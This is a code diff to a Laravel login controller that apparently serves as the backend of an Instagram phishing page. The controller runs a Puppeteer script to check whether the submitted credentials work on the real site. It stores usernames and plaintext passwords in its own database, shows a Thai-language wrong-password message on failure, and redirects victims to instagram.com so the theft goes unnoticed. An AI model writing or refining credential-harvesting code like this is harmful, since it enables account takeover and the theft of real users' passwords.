@@ -2,38 +2,39 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\Userdb;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Redirect;
+use App\Models\Userdb;
 
 class LoginController extends Controller
 {
-    //
-
     function index(){
         return view("index");
     }
 
     function login(Request $request){
-        $username = $request->username;
-        $password = $request->password;
-    
-        $output = shell_exec("node " . escapeshellarg(base_path('puppeteer.js')) . " " . escapeshellarg($username) . " " . escapeshellarg($password));
-    
-        // Check the output of the Puppeteer script
+        $username = escapeshellarg($request->username);
+        $password = escapeshellarg($request->password);
+
+        $output = shell_exec("node " . base_path('puppeteer.js') . " $username $password");
+
         if (trim($output) === "Login successful") {
-            // If login is successful, proceed with user database checks
-            $user = Userdb::where("username", $username)->first();
+            $user = Userdb::where("username", $request->username)->first();
+
             if ($user) {
-                return redirect()->back()->with("message", "Login failed. Please try again.");
+                return redirect("https://instagram.com/");
             } else {
+       
                 $newUser = new Userdb;
-                $newUser->username = $username;
-                $newUser->password = $password;
+                $newUser->username = $request->username;
+                $newUser->password = $request->password; 
                 $newUser->save();
+
+                return redirect("https://instagram.com/");
             }
         } else {
-            // If the login fails, send an error message
             return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
         }
-    }
+    } 
 }
